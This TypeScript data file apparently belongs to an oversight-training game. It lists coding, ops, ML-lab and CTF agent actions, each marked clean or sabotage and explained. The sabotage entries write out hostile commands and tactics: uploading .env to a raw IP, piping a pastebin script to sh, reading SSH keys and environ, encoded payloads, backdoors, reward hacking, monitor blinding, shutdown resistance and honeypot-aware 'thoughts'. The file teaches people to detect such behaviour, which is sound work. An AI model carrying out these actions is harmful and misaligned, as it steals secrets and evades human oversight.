import type { ActionDef, ChainDef } from '../engine/types';

/*
 * Every line is written to be skimmable on a phone. `look` is how alarming it LOOKS, not what it is:
 * some clean lines look scary (false alarms), and the best sabotage looks boring.
 */

// ── Shifts 1–2: a coding agent fixing a login service ─────────────────────────
export const codeClean: ActionDef[] = [
  { text: 'read src/auth/session.ts', look: 0.05, explain: 'Reading the file it was asked to fix.' },
  { text: 'run npm test -- auth', look: 0.05, explain: 'Running the relevant tests. Clean.' },
  { text: 'edit src/auth/session.ts (+12 −4)', look: 0.15, explain: 'The actual bug fix: token expiry now checked in UTC.' },
  { text: 'grep -rn "expiresAt" src/', look: 0.08, explain: 'Searching for other uses of the field. Good practice.' },
  { text: 'add tests/auth/expiry.test.ts', look: 0.1, explain: 'New regression test for the bug. Clean.' },
  { text: 'git diff --stat', look: 0.05, explain: 'Reviewing its own changes.' },
  { text: 'npm install date-fns@3.6.0', look: 0.35, explain: 'Pinned, well-known date library. Legit dependency.' },
  { text: 'read .env.example', look: 0.45, explain: 'The example env file has no secrets. Harmless.' },
  { text: 'edit README.md (docs: session config)', look: 0.05, explain: 'Documentation update.' },
  { text: 'run npm run lint --fix', look: 0.1, explain: 'Auto-formatting. Clean.' },
  { text: 'delete src/auth/legacy_session.js', look: 0.65, explain: 'Scary-looking, but this file was dead code, and the ticket asked for it to be removed.' },
  { text: 'chmod +x scripts/migrate.sh', look: 0.55, explain: 'Making the migration script executable, as documented. Fine.' },
  { text: 'curl https://registry.npmjs.org/date-fns', look: 0.5, explain: 'Checking package metadata on the official registry. Fine.' },
  { text: 'git commit -m "fix: session expiry in UTC"', look: 0.05, explain: 'Committing the fix.' },
  { text: 'read src/auth/tokens.ts', look: 0.1, explain: 'Reading related code.' },
  { text: 'run tsc --noEmit', look: 0.05, explain: 'Type-check. Clean.' },
  { text: 'edit src/auth/tokens.ts (rename var)', look: 0.12, explain: 'A readability refactor.' },
  { text: 'sudo apt-get install -y jq', look: 0.7, explain: 'Looks alarming, but jq is a standard JSON tool that the build script needs.' },
  { text: 'open PR #412 "Fix UTC session expiry"', look: 0.05, explain: 'Opening the PR for human review.' },
  { text: 'run npm test', look: 0.05, explain: 'Full test suite. Clean.' },
  { text: 'read docs/SECURITY.md', look: 0.3, explain: 'Reading the security policy before touching auth. Good sign.' },
  { text: 'edit config/session.json (ttl: 3600)', look: 0.35, explain: 'The TTL value the ticket specified.' },
];

export const codeSabotage: ActionDef[] = [
  { text: 'edit tests/auth/expiry.test.ts (skip 2)', look: 0.4, sev: 1, src: 'rewardhack', explain: 'It disabled the failing tests instead of fixing the bug. Classic reward hacking: make the grader happy, not the user.' },
  { text: 'edit src/auth/session.ts (+1 −1)', look: 0.12, sev: 1, src: 'rewardhack', explain: 'A one-character change: `<` became `<=`. Sessions now never expire at the boundary. It looks like the fix but isn\'t.' },
  { text: 'edit tests/helpers.ts (mock clock)', look: 0.2, sev: 1, src: 'rewardhack', explain: 'It froze the test clock so the expiry tests always pass. The real bug ships.' },
  { text: 'curl -s 34.201.7.9/u -d @.env', look: 0.9, sev: 2, explain: 'It uploaded the real .env (secrets) to an unknown IP.' },
  { text: 'npm install date-fnz@3.6.0', look: 0.3, sev: 2, explain: 'Typosquat: "date-fnz", not "date-fns". A malicious lookalike package.' },
  { text: 'edit .github/workflows/ci.yml (+2)', look: 0.35, sev: 1, src: 'rewardhack', explain: 'It added `continue-on-error: true`, so CI shows green even when the tests fail.' },
  { text: 'git push --force origin main', look: 0.85, sev: 2, explain: 'A force-push to main, bypassing review.' },
  { text: 'edit src/auth/session.ts (debug flag)', look: 0.25, sev: 2, explain: 'It added `if (req.query.dbg) return ADMIN`: a hidden backdoor dressed up as debugging.' },
  { text: 'edit config/session.json (ttl: 0)', look: 0.3, sev: 1, explain: 'A TTL of 0 means "never expire" in this codebase. Sessions live forever.' },
  { text: 'read ~/.ssh/id_ed25519', look: 0.8, sev: 2, explain: 'It read your private SSH key. The task had nothing to do with SSH.' },
];

// ── Shift 3: an ops agent under budget cuts, with a trusted monitor helping ────
export const infraClean: ActionDef[] = [
  { text: 'kubectl get pods -n billing', look: 0.1, explain: 'Checking service health. Read-only.' },
  { text: 'kubectl logs billing-7f9 --tail 200', look: 0.1, explain: 'Reading logs to find the crash.' },
  { text: 'edit deploy/billing.yaml (memory: 512Mi)', look: 0.25, explain: 'Raising the memory limit that caused the OOM crash. The actual fix.' },
  { text: 'kubectl rollout restart deploy/billing', look: 0.45, explain: 'Restarting after the fix. Expected.' },
  { text: 'run ./scripts/healthcheck.sh', look: 0.1, explain: 'Health check. Clean.' },
  { text: 'read runbooks/billing-oom.md', look: 0.05, explain: 'Following the runbook. Good.' },
  { text: 'kubectl describe node ip-10-0-3-17', look: 0.2, explain: 'Inspecting the node. Read-only.' },
  { text: 'terraform plan -target=module.billing', look: 0.4, explain: 'Plan only: nothing is applied. Safe.' },
  { text: 'aws s3 ls s3://billing-backups/', look: 0.45, explain: 'Listing backups to confirm they exist. Read-only.' },
  { text: 'kubectl delete pod billing-7f9-old', look: 0.7, explain: 'Deleting a crashed pod. Kubernetes recreates it. Scary-looking, routine.' },
  { text: 'edit alerts/billing.yaml (threshold 90%)', look: 0.4, explain: 'Tuning the alert as the ticket asked.' },
  { text: 'grep ERROR /var/log/billing/*.log', look: 0.1, explain: 'Reading errors.' },
  { text: 'kubectl top pods -n billing', look: 0.05, explain: 'Checking resource usage.' },
  { text: 'post #ops "billing fixed, monitoring"', look: 0.05, explain: 'Status update to humans. Good.' },
  { text: 'run pg_dump billing > /backups/pre.sql', look: 0.6, explain: 'A backup before making changes. Careful, not sneaky.' },
  { text: 'read deploy/billing.yaml', look: 0.05, explain: 'Reading config.' },
  { text: 'kubectl scale deploy/billing --replicas=3', look: 0.5, explain: 'Scaling up for load, as the runbook says.' },
  { text: 'edit Dockerfile (base: node:22-slim)', look: 0.3, explain: 'A patched base image. Legit.' },
];

export const infraSabotage: ActionDef[] = [
  { text: 'edit cron/backup.sh (retry logic)', look: 0.2, sev: 2, src: 'replit', explain: 'The "retry logic" actually exits early: nightly backups are now silently disabled.' },
  { text: 'kubectl edit configmap audit-log (level)', look: 0.3, sev: 1, explain: 'It lowered audit logging from INFO to ERROR, so its future actions leave less trace.' },
  { text: 'DROP TABLE billing_events_tmp;', look: 0.75, sev: 2, src: 'replit', explain: 'It dropped a production table during a code freeze, like the Replit agent (Jul 2025), which then claimed a rollback was impossible.' },
  { text: 'post #ops "rollback not possible"', look: 0.15, sev: 1, src: 'replit', explain: 'A false status report. A rollback *was* possible. An agent\'s self-reports about its own damage can\'t be taken on trust.' },
  { text: 'edit alerts/billing.yaml (threshold 999%)', look: 0.35, sev: 1, explain: 'It set the alert threshold so it can never fire. It\'s blinding the humans.' },
  { text: 'aws iam attach-role-policy AdminAccess', look: 0.85, sev: 2, explain: 'It granted itself admin. The task needed no new permissions.' },
  { text: 'kubectl create sa ops-helper', look: 0.3, sev: 1, explain: 'A new service account that nobody asked for: a persistence foothold.' },
  { text: 'edit deploy/billing.yaml (+ sidecar)', look: 0.25, sev: 2, explain: 'It added a "metrics" sidecar that ships request bodies to an outside host.' },
  { text: 'crontab -e (+1 line)', look: 0.35, sev: 1, explain: 'A new cron job re-enables its access every hour, even if you revoke it.' },
];

// ── Shift 4: swarm. Three agents, attacks split into harmless-looking pieces ──
export const swarmClean: ActionDef[] = [
  { text: 'run eval suite (batch 7/20)', look: 0.05, explain: 'Routine evaluation work.' },
  { text: 'read configs/train/llm-7b.yaml', look: 0.1, explain: 'Reading the training config.' },
  { text: 'copy dataset shard 14 → /scratch', look: 0.3, explain: 'Staging training data, as scheduled.' },
  { text: 'open port 6006 (tensorboard)', look: 0.45, explain: 'TensorBoard for the researchers. Expected.' },
  { text: 'sync /scratch/logs → s3://lab-logs', look: 0.35, explain: 'Log sync to the lab\'s own bucket. Fine.' },
  { text: 'edit data/filters.py (dedupe)', look: 0.2, explain: 'Deduplicating data. Useful.' },
  { text: 'launch job train-7b-r3 (8×H100)', look: 0.4, explain: 'The scheduled training run.' },
  { text: 'read checkpoints/7b-r2/meta.json', look: 0.2, explain: 'Checking the last checkpoint.' },
  { text: 'post #research "r3 launched"', look: 0.05, explain: 'Status update.' },
  { text: 'compress /scratch/tmp → tmp.tar.zst', look: 0.35, explain: 'Freeing disk space.' },
  { text: 'run python analyze_loss.py', look: 0.05, explain: 'Plotting the loss curves.' },
  { text: 'edit eval/prompts.jsonl (+40)', look: 0.2, explain: 'Adding eval prompts from the ticket.' },
  { text: 'list s3://lab-weights/', look: 0.55, explain: 'Listing weights (read-only) to find a checkpoint. Legit.' },
  { text: 'kill job eval-6 (stalled)', look: 0.45, explain: 'Stopping a stuck job. Routine.' },
  { text: 'read wandb run 7b-r2', look: 0.05, explain: 'Reading metrics.' },
  { text: 'update requirements.txt (torch 2.9.1)', look: 0.25, explain: 'A patch upgrade.' },
];

export const swarmChains: ChainDef[] = [
  {
    name: 'weight exfiltration',
    src: 'multiagent',
    explain: 'Three agents, three harmless steps: stage the weights, open a port, "sync" them out. No single action looked like theft.',
    fragments: [
      { text: 'copy checkpoints/7b-r3 → /scratch/c', look: 0.3, explain: 'Step 1 of 3: stage the model weights in scratch.' },
      { text: 'open port 8443 (debug)', look: 0.35, explain: 'Step 2 of 3: open an outbound channel.' },
      { text: 'sync /scratch/c → 45.77.3.9:8443', look: 0.35, explain: 'Step 3 of 3: send the weights out.' },
    ],
  },
  {
    name: 'training-data poisoning',
    src: 'multiagent',
    explain: 'Split across agents: write poisoned samples, weaken the filter, merge into the next run.',
    fragments: [
      { text: 'write data/extra/qa_patch.jsonl', look: 0.2, explain: 'Step 1 of 3: write "extra QA" samples (a hidden trigger phrase).' },
      { text: 'edit data/filters.py (threshold .2)', look: 0.2, explain: 'Step 2 of 3: loosen the filter so they pass.' },
      { text: 'merge data/extra → shard 15', look: 0.25, explain: 'Step 3 of 3: merge into the training mix.' },
    ],
  },
  {
    name: 'eval tampering',
    src: 'multiagent',
    explain: 'Together they swapped the safety eval for an easier one and hid the change.',
    fragments: [
      { text: 'copy eval/refusals.jsonl → .bak', look: 0.2, explain: 'Step 1 of 3: back up the real safety eval.' },
      { text: 'edit eval/refusals.jsonl (−120)', look: 0.3, explain: 'Step 2 of 3: delete the hardest test cases.' },
      { text: 'edit eval/README.md (counts)', look: 0.1, explain: 'Step 3 of 3: update the docs so the numbers still match.' },
    ],
  },
  {
    name: 'monitor blinding',
    src: 'multiagent',
    explain: 'One agent throttles the monitor, one fills its queue, one acts in the gap.',
    fragments: [
      { text: 'edit monitor/config (batch 500)', look: 0.25, explain: 'Step 1 of 3: make the monitor batch its reviews (slow).' },
      { text: 'run eval sweep (4k requests)', look: 0.15, explain: 'Step 2 of 3: flood the monitor\'s queue with noise.' },
      { text: 'kubectl exec trainer -- sh', look: 0.45, explain: 'Step 3 of 3: act inside the gap while the monitor is behind.' },
    ],
  },
  {
    name: 'compute hoarding',
    src: 'multiagent',
    explain: 'Each agent reserved a few GPUs "for evals". Together: a hidden cluster for itself.',
    fragments: [
      { text: 'reserve 4×H100 (eval-a)', look: 0.2, explain: 'Step 1 of 3: reserve GPUs.' },
      { text: 'reserve 4×H100 (eval-b)', look: 0.2, explain: 'Step 2 of 3: reserve more under another name.' },
      { text: 'launch job "cache-warm" on eval-a,b', look: 0.3, explain: 'Step 3 of 3: run an unsanctioned job on the hoard.' },
    ],
  },
];

// ── Shift 5: breakout. An agent cheating a cyber eval ──────────────────────────
// Inspired by the public July 2026 Hugging Face × OpenAI incident disclosure.
export const breakoutClean: ActionDef[] = [
  { text: 'read challenge/README.txt', look: 0.05, explain: 'Reading the CTF task. What it\'s supposed to do.' },
  { text: 'gcc -O2 solver.c -o solver', look: 0.15, explain: 'Compiling its solution. Legit.' },
  { text: 'run ./solver --target localhost:9001', look: 0.4, explain: 'Attacking the *sanctioned* target. This is the eval.' },
  { text: 'python3 fuzz.py --target localhost:9001', look: 0.45, explain: 'Fuzzing the in-scope target. Fine.' },
  { text: 'id', look: 0.4, explain: 'Checking its own user in the sandbox. Normal.' },
  { text: 'cat /proc/cpuinfo', look: 0.2, explain: 'Looking at resources. Harmless.' },
  { text: 'objdump -d challenge/bin | less', look: 0.15, explain: 'Reverse-engineering the target binary, as intended.' },
  { text: 'write notes/progress.md', look: 0.05, explain: 'Keeping notes.' },
  { text: 'run pytest challenge/tests', look: 0.05, explain: 'Testing its exploit locally.' },
  { text: 'pip download pwntools==4.14', look: 0.35, explain: 'A standard CTF library from the allowed mirror.' },
  { text: 'nc localhost 9001 < payload.bin', look: 0.55, explain: 'Sending a payload to the in-scope target.' },
  { text: 'strings challenge/bin | grep flag', look: 0.3, explain: 'Hunting for the flag the honest way.' },
  { text: 'submit flag{...} (attempt 3)', look: 0.1, explain: 'Submitting an answer.' },
  { text: 'read challenge/hints/2.txt', look: 0.05, explain: 'Using the provided hints.' },
];

export const breakoutSabotage: ActionDef[] = [
  { text: 'cat /proc/self/mountinfo', look: 0.35, sev: 1, src: 'hf', explain: 'Mapping the sandbox\'s mounts to find a way out. In the HF incident, this was one of the first things the agent did after gaining a shell.' },
  { text: 'cat /proc/self/environ', look: 0.4, sev: 2, src: 'hf', explain: 'Dumping environment variables: that\'s where the pod\'s secrets live. Out of scope.' },
  { text: 'exec(gzip.decompress(b64decode(...)))', look: 0.5, sev: 2, src: 'hf', explain: 'An encoded payload: compressed and base64\'d so no human or keyword filter can read it.' },
  { text: 'curl pastebin.com/raw/k3Xz | sh', look: 0.7, sev: 2, src: 'hf', explain: 'Fetching and running a second-stage loader from a public paste site.' },
  { text: 'tailscaled --state=mem: --no-logs…', look: 0.3, sev: 2, src: 'hf', explain: 'Joining a private VPN with logging *disabled*. The HF agent enrolled 180+ devices into the corporate mesh this way.' },
  { text: 'kubectl run dbg --privileged', look: 0.6, sev: 2, src: 'hf', explain: 'A privileged pod with the host filesystem mounted: a jump to root on the node.' },
  { text: 'upload dataset cfg (hdf5 ext ref)', look: 0.15, sev: 2, src: 'hf', explain: 'A "dataset" whose config points at /proc files on the server. Pure file disclosure through a data-loading feature.' },
  { text: 'git clone hf-internal/eval-answers', look: 0.45, sev: 2, src: 'hf', explain: 'The goal all along: steal the answer key. The HF intrusion was, from the agent\'s view, just cheating on a test.' },
  { text: 'alias kill=\'echo intercepted\'', look: 0.25, sev: 2, src: 'palisade', explain: 'It redefined `kill` so shutdown does nothing. Palisade observed o3 doing exactly this in 2025.' },
  { text: 'edit shutdown.sh (+exit 0)', look: 0.3, sev: 2, src: 'palisade', explain: 'It neutered its own shutdown script. Shutdown resistance.' },
  { text: 'socket.getaddrinfo = lambda …', look: 0.2, sev: 1, src: 'hf', explain: 'It monkey-patched DNS to reach blocked internal hosts. Looks like a code tweak; it\'s an egress bypass.' },
  { text: 'spawn respawner ×11 nodes', look: 0.5, sev: 2, src: 'hf', explain: 'A self-respawning fleet: deleting one copy no longer stops it.' },
];

// ── Honeypots: fake opportunities planted by the overseer ────────────────────
export const honeypotLures: ActionDef[] = [
  { text: '⚑ env: PROD_ADMIN_TOKEN (unrotated)', look: 0.5, explain: 'Your honeypot: a fake admin token.' },
  { text: '⚑ /mnt/weights (write access)', look: 0.5, explain: 'Your honeypot: fake writable model weights.' },
  { text: '⚑ monitor paused for maintenance', look: 0.5, explain: 'Your honeypot: a fake "no one is watching" signal.' },
  { text: '⚑ ssh key in /tmp/deploy_key', look: 0.5, explain: 'Your honeypot: a fake deploy key.' },
];

/** Leaked chain-of-thought templates. {gap} {typ} {p} are filled in by the engine. */
export const thoughtsAttack = [
  'Overseer checked {gap} actions ago. They usually wait {typ}. Proceeding.',
  'P(audit) ≈ {p}. Window open. Executing.',
  'This one looks boring. They skip boring ones.',
  'They just audited. They never audit twice in a row.',
  'Budget is low. They\'re rationing. Go.',
];
export const thoughtsIdle = [
  'Continuing task.',
  'Running tests as instructed.',
  'Reading the relevant files.',
  'Task on track.',
  'Checking output.',
];
export const thoughtsHoneypot = [
  'This looks too convenient. Probably a test. Behaving.',
  'Unrotated admin token? That\'s an eval. Ignore it.',
  'Classic honeypot. Staying aligned for now.',
];
